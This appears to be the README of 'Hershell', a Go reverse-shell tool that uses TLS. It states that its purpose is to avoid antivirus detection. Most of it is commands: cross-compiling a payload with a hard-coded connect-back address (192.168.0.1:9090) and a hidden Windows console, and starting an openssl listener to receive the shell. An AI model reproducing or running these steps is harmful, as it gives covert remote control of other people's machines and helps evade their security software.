# Hershell

Simple TCP reverse shell written in [Go](https://golang.org).
It uses TLS to secure the communications.

## Why ?

Although meterpreter payloads are great, they are sometimes spotted by AV products.
The goal of this project is to get a simple reverse shell, which can work on multiple systems.

## How ?

Since it's written in Go, you can cross compile the source for the desired architecture.

For windows:

```bash
$ GOOS=windows GOARCH=amd64 go build --ldflags "-X main.connectString=192.168.0.1:9090 -H=windowsgui" -o reverse.exe hershell.go
```

For Linux:
```bash
$ GOOS=linux GOARCH=amd64 go build --ldflags "-X main.connectString=192.168.0.1:9090" -o reverse.exe hershell.go
```

Just use the GOOS and GOARCH variables to define the target.

On the server side, you can use the openssl integrated TLS server:

```bash
# Certificate and private key generation
$ openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
# Start the server
$ openssl s_server -cert /tmp/cert.pem -key /tmp/key.pem -accept 9090
```

## TODO

- Certificate pinning
